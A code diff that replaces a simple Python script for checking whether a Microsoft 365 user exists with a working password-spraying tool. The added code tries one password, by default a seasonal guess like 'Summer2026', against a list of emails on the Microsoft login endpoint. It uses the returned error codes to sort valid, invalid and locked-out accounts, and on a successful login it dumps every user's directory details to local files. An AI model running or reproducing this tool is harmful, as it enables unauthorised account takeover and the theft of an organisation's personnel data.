@@ -1,78 +1,133 @@
 #!/usr/bin/env python3
-"""
-m365V.py
-
-This script uses the Microsoft Authentication Library (MSAL) to check if a user exists in Microsoft 365.
-
-The script requires the following parameters:
-- username: The username of the user to check.
-- client_id: The client ID of an Azure AD application.
-- client_secret: The client secret of the Azure AD application.
-- tenant_id: The tenant ID of the Azure AD tenant.
-
-
-To do:
-- Add error handling.
-- Add command-line arguments.
-- Add logging.
-- Add more detailed output.
-- Add support for checking multiple users.
-- Add support for checking user attributes.
-- Add support for checking groups.
-- Add support for checking licenses.
-- Add support for checking roles.
-- Add support for checking multiple applications using secrets
-
-"""
-
+#!/usr/bin/python3
+import queue
+import threading
 import requests
-import argparse
-import msal
+import sys
+import json
+import datetime
+import time
 
-def check_user_exists(username, client_id, client_secret, tenant_id):
-    # Set up the MSAL client
-    authority = f"https://login.microsoftonline.com/{tenant_id}"
-    app = msal.ConfidentialClientApplication(
-        client_id,
-        authority=authority,
-        client_credential=client_secret
-    )
+def loginValidity(emails, password):
+        def getAllUsers(response, email):
+                #This function is based off of the requests sent when using the powershell function "Get-AzureADUser"
+                #The tennant is the domain name
+                tennant = email[email.find("@")+1:]
+                resource = response["resource"]
+                #Use the resource specified in the response to the login, and request up to 999 users from the API
+                url = resource + "/" + tennant + "/users?api-version=1.6&%24top=999"
+                #Include the login token recieved in the response to the login
+                header = {"Accept": "application/json", "Authorization": response["token_type"] + " " + response["access_token"], "cmdlet-na": "Get-AzureADUser", "client-request-id": "03471fbe-d9fd-4992-87f0-42d9cc49c7e0", "User-Agent": "Swagger-Codegen/1.4.0.0/csharp"}
+                response = requests.get(url, headers=header)
+                #The response text will be JSON with the users and all of their Azure AD attributes
+                responseArray = json.loads(response.text)
+                users = responseArray["value"]
+                while "odata.nextLink" in responseArray:
+                        skiptoken = responseArray["odata.nextLink"]
+                        skiptoken = skiptoken[skiptoken.find("skiptoken=")+10:]
+                        url = resource + "/" + tennant + "/users?api-version=1.6&%24top=999&%24skiptoken=" + skiptoken
+                        response = requests.get(url, headers=header)
+                        responseArray = json.loads(response.text)
+                        users.extend(responseArray["value"])
 
-    # Get an access token
-    scopes = ["https://graph.microsoft.com/.default"]
-    result = app.acquire_token_silent(scopes, account=None)
-    if not result:
-        result = app.acquire_token_for_client(scopes=scopes)
+                filename = tennant[:tennant.rfind(".")]
+                outputData(users, filename)
 
-    if "access_token" in result:
-        # Use the access token to make a request to Microsoft Graph
-        graph_url = f"https://graph.microsoft.com/v1.0/users/{username}"
-        headers = {
-            'Authorization': 'Bearer ' + result['access_token']
-        }
-        response = requests.get(graph_url, headers=headers)
+        def outputData(users, filename):
+                with open(filename + "-O365-Dump.json", "w") as f:
+                        f.write(json.dumps(users, indent=4))
+                usersOut = []
+                biggest = [0, 0, 0, 0, 0, 0, 0]
+                for user in users:
+                        data = [user["displayName"], user["jobTitle"], user["mail"], user["userPrincipalName"], user["telephoneNumber"], str(user["accountEnabled"]), user["onPremisesDistinguishedName"]]
+                        for i, item in enumerate(data):
+                                if item is None:
+                                        data[data.index(item)] = ""
+                                else:
+                                        data[data.index(item)] = item.strip()
+                        usersOut.append(data)
+                with open(filename + "-O365-Dump.csv", "w") as out:
+                        out.write(u"\"Display Name\",\"Job Title\",\"Email\",\"User Principal Name\",\"Phone Number\",\"Account Enabled\",\"On Premises DN\"\n")
+                        for user in usersOut:
+                                out.write("\"" + "\",\"".join(user) + "\"\n")
+                print("Your files have been saved as:\n\t" + filename + "-O365-Dump.csv\n\t" + filename + "-O365-Dump.json")
 
-        if response.status_code == 200:
-            print(f"User {username} exists.")
-            return True
-        elif response.status_code == 404:
-            print(f"User {username} does not exist.")
-            return False
-        else:
-            print(f"Error checking user, unknown status code: {response.status_code}")
-            return None
-    else:
-        print(result.get("error"))
-        print(result.get("error_description"))
-        print(result.get("correlation_id"))
-        return None
+        def parseError(responseArray, email):
+                errorDescription = responseArray["error_description"]
+                errorCode = errorDescription.split(":")[0]
+                if errorCode == "AADSTS50034":
+                        invalid.append(email)
+                elif errorCode == "AADSTS50126":
+                        print(email)
+                elif errorCode == "AADSTS50053":
+                        tryLater.append(email)
+                else:
+                        errors.append(email + "\n" + errorDescription.split("\r\n")[0] + "\n")
 
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Check if a user exists in Microsoft 365.")
-    parser.add_argument("username", help="The username of the user to check.")
-    parser.add_argument("client_id", help="The client ID of an Azure AD application.")
-    parser.add_argument("client_secret", help="The client secret of the Azure AD application.")
-    parser.add_argument("tenant_id", help="The tenant ID of the Azure AD tenant.")
-    args = parser.parse_args()
+        def testEmails(list):
+                for email in list:
+                        response = requests.post("https://login.microsoftonline.com/Common/oauth2/token", data={"grant_type": "password", "username": email, "password": password, "client_id": clientID, "resource": "https://graph.windows.net", "scope": "openid"})
+                        responseArray = json.loads(response.text)
+                        #An error description is only included if the login fails
+                        if "error_description" in responseArray:
+                                if email in tryLater:
+                                        tryLater.remove(email)
+                                parseError(responseArray, email)
+                        else:
+                                #If the login is successful, let's just dump all the users from O365
+                                print(email)
+                                print("\n\tCorrect password, " + email + ":" + password + "\n\tExtracting all users from O365\n")
+                                getAllUsers(responseArray, email)
+                                sys.exit()
 
-    check_user_exists(args.username, args.client_id, args.client_secret, args.tenant_id)
+        if password == "":
+                seasons = ["Winter", "Spring", "Summer", "Fall"]
+                seasonInt = int((int((datetime.datetime.now()).strftime("%m"))-1)/3)
+                year = (datetime.datetime.now() - datetime.timedelta(days=30)).strftime("%Y")
+                password = seasons[seasonInt] + year
+
+        clientID = '1b730954-1685-4b74-9bfd-dac224a7b894'
+
+        print("Attempting to find valid users, using password: " + password)
+        print("Valid emails:")
+        testEmails(emails)
+
+def usage():
+        print("Office 365 Validity Tester\n\nExamples:\n\t" + sys.argv[0] + " ./emailList.txt\n\t" + sys.argv[0] + " ./emails.txt Password1")
+        sys.exit(0)
+
+def parseArgs():
+        password = ""
+        if len(sys.argv) < 2:
+                usage()
+        emailFile = sys.argv[1]
+        if len(sys.argv) > 2:
+                password = sys.argv[2]
+        emailList = open(emailFile).read().splitlines()
+        while "" in emailList:
+                emailList.remove("")
+        return (emailList, password)
+
+if __name__ == '__main__':
+        emailList, password = parseArgs()
+
+        invalid = []
+        tryLater = []
+        errors = []
+
+        loginValidity(emailList, password)
+
+        if invalid:
+                print("\n\nInvalid emails:")
+                for email in invalid:
+                        print(email)
+
+        if tryLater:
+                print("\nRate limiting prevented testing these users, try them again later")
+                for email in tryLater:
+                        print(email)
+
+        if errors:
+                print("\nErrors:\n")
+                for error in errors:
+                        print(error)
